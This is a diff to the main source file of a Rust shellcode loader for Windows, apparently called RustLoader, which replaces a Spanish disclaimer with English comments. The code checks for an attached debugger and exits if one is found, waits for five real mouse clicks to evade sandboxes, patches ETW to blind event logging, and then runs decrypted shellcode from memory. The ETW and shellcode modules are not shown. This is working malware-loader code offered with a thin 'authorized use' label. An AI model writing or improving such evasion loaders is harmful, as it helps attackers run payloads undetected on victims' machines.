@@ -1,52 +1,55 @@
-/*
- * DISCLAIMER
- * Este software está destinado únicamente para propósitos educativos y de investigación. No está diseñado,
- * ni debería ser utilizado, para actividades ilegales. El uso de este software se proporciona "tal cual",
- * sin garantía de ningún tipo, expresada o implícita, incluyendo pero no limitado a las garantías de
- * comercialización, adecuación para un propósito particular y no infracción. En ningún caso los
- * autores serán responsables de cualquier reclamo, daño u otra responsabilidad, ya sea en una acción de
- * contrato, agravio o de otro tipo, que surja de, fuera de, o en conexión con el software o el uso u
- * otras operaciones en el software.
- *
- * Por favor, úselo con responsabilidad y ética.
- */
-extern crate kernel32;
-extern crate winapi;
+//! RustLoader - Advanced shellcode loader with anti-debugging and evasion.
+//!
+//! This loader implements multiple defense-evasion techniques:
+//! - Debugger detection via IsDebuggerPresent
+//! - Human interaction simulation (mouse click requirement)
+//! - ETW patching to blind event tracing
+//! - Encrypted shellcode execution from heap memory
+//!
+//! For authorized security research and penetration testing only.
 
 use std::process;
 
 use winapi::um::debugapi::IsDebuggerPresent;
 use winapi::um::winuser::{GetAsyncKeyState, VK_LBUTTON};
 
-use crate::patch::patch_process;
+use crate::patch::patch_etw;
 use crate::utils::sleep_millis;
 
 mod patch;
 mod shellcode;
 mod utils;
 
+const REQUIRED_CLICKS: u32 = 5;
+
 fn main() {
+    // Anti-debugging: exit if a debugger is attached
     if unsafe { IsDebuggerPresent() } != 0 {
-        println!("Depurador detectado. Terminando el proceso.");
         process::exit(1);
     }
 
-    check_mouse_click(5);
+    // Sandbox evasion: require human interaction before proceeding
+    wait_for_clicks(REQUIRED_CLICKS);
 
-    patch_process();
-    shellcode::execute_shellcode();
+    // Patch ETW to prevent event logging
+    patch_etw();
+
+    // Decrypt and execute shellcode from memory
+    shellcode::execute();
 }
 
-fn check_mouse_click(min_clicks: u32) {
+/// Waits for a minimum number of mouse clicks before continuing execution.
+/// This acts as a sandbox evasion technique — automated analysis environments
+/// typically do not simulate real user interaction.
+fn wait_for_clicks(min_clicks: u32) {
     let mut count: u32 = 0;
-    println!("Esperando {} clics del mouse...", min_clicks);
 
     while count < min_clicks {
         unsafe {
-            let key_state = GetAsyncKeyState(VK_LBUTTON);
-            if key_state & (1 << 15) != 0 {
+            let state = GetAsyncKeyState(VK_LBUTTON);
+            if state & (1 << 15) != 0 {
                 count += 1;
-                println!("Clic detectado: {}", count);
+                // Wait for button release to avoid counting a single click multiple times
                 while GetAsyncKeyState(VK_LBUTTON) & (1 << 15) != 0 {
                     sleep_millis(10);
                 }
